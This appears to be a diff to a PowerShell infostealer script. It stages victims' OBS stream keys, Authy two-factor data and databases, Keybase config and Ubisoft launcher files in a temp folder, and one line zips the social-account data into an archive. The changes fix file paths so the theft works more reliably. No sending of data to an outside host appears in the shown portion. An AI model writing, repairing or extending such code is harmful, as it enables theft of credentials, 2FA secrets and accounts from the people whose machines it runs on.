@@ -89,8 +89,8 @@ New-Item -Path "$env:tmp/$FolderName/Streaming" -ItemType Directory
 # OBS
 $obs = Get-Childitem -Path $env:appdata\obs-studio\basic\profiles\ -Include service.json -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($obs -ne $null) {
-	New-Item -Path $env:tmp/$FolderName/OBS -ItemType Directory
-	Get-Content -Path $obs >> $env:tmp/$FolderName/OBS/service.json
+	New-Item -Path $env:tmp/$FolderName/Streaming/OBS -ItemType Directory
+	Get-Content -Path $obs >> $env:tmp/$FolderName/Streaming/OBS/service.json
 }
 
 # StreamlabsOBS
@@ -387,7 +387,7 @@ if (Test-Path $path -PathType Any) {
 	Copy-Item "$env:appdata\Authy Desktop\Preferences" "$env:tmp/$FolderName/2FA/Authy/Preferences"
 	Copy-Item "$env:appdata\Authy Desktop\Local Storage\leveldb" "$env:tmp/$FolderName/2FA/Authy/Local Storage/leveldb" -Recurse
 	Copy-Item "$env:appdata\Authy Desktop\Session Storage" "$env:tmp/$FolderName/2FA/Authy/Session Storage" -Recurse
-	Copy-Item "$env:appdataAuthy Desktop\databases" "$env:tmp/$FolderName/2FA/Authy/databases" -Recurse
+	Copy-Item "$env:appdata\Authy Desktop\databases" "$env:tmp/$FolderName/2FA/Authy/databases" -Recurse
 }
 
 # WinAuth
@@ -434,7 +434,7 @@ if (Test-Path "$env:appdata/Telegram Desktop/log.txt" -PathType Any) {
 # Keybase
 if (Test-Path "$env:appdata/../Local/Keybase/config.json" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/Socials/Keybase -ItemType Directory
-	Copy-Item "$env:appdata/Keybase/config.json" "$env:tmp/$FolderName/Socials/Keybase/config.json"
+	Copy-Item "$env:appdata/../Local/Keybase/config.json" "$env:tmp/$FolderName/Socials/Keybase/config.json"
 }
 
 Compress-Archive -Path $env:tmp/$FolderName/Socials -DestinationPath "$env:tmp/Socials-$ZIP"
@@ -465,9 +465,9 @@ if ([System.IO.File]::Exists("$env:appdata/Battle.net/Battle.net.config")) {
 }
 
 # Ubisoft
-if (Test-Path "$env:appdata/../Ubisoft Game Launcher" -PathType Any) {
+if (Test-Path "$env:appdata/../Local/Ubisoft Game Launcher" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/Gaming/BattleNet -ItemType Directory
-	Copy-Item "$env:appdata/../Ubisoft Game Launcher" "env:tmp/$FolderName/Gaming/Ubisoft" -Recurse
+	Copy-Item "$env:appdata/../Local/Ubisoft Game Launcher" "env:tmp/$FolderName/Gaming/Ubisoft" -Recurse
 }
 
 # Roblox
